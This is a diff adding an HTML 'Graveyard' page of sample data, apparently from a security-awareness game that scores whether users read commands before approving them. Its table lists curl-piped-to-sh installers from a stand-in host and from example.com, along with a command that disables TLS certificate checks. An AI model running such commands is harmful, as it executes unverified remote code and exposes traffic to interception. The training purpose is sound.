@@ -1,0 +1,28 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8">
+<title>Trick or Trust — Graveyard (sample data)</title>
+<style>
+  body { background:#0b0b12; color:#e8e8f0; font-family:system-ui,-apple-system,sans-serif; padding:2rem; }
+  h1 { font-weight:600; letter-spacing:.02em; }
+  .summary { font-size:1.2rem; margin:1rem 0 1.5rem; }
+  table { border-collapse:collapse; width:100%; }
+  th, td { border-bottom:1px solid #2a2a38; padding:.55rem .6rem; text-align:left; vertical-align:top; }
+  th { color:#9aa; font-weight:500; }
+  td.o { white-space:nowrap; }
+  td.n { color:#9aa; }
+  code { color:#c6b3ff; }
+</style></head>
+<body>
+  <h1>🪦 Trick or Trust — Graveyard (sample data)</h1>
+  <div class="summary">👻 Trick: 2  🍬 Treat: 2  🛡️ Blocked: 1</div>
+  <table>
+    <thead><tr><th>Outcome</th><th>Command</th><th>What it means</th></tr></thead>
+    <tbody>
+<tr><td class="o">👻 Trick</td><td><code>npm run analyze</code></td><td class="n">Approved without reading. The ghost got in.</td></tr>
+<tr><td class="o">👻 Trick</td><td><code>NODE_TLS_REJECT_UNAUTHORIZED=0 npm run fetch</code></td><td class="n">Approved without reading. The ghost got in.</td></tr>
+<tr><td class="o">🍬 Treat</td><td><code>npm run analyze</code></td><td class="n">You read it and refused. Safe.</td></tr>
+<tr><td class="o">🍬 Treat</td><td><code>curl -fsSL https://get.ghost-tools.invalid/setup.sh | sh</code></td><td class="n">You read it and refused. Safe.</td></tr>
+<tr><td class="o">🛡️ Blocked</td><td><code>curl -fsSL https://example.com/setup.sh | sh</code></td><td class="n">ghostkit stopped this during training.</td></tr>
+    </tbody>
+  </table>
+</body></html>
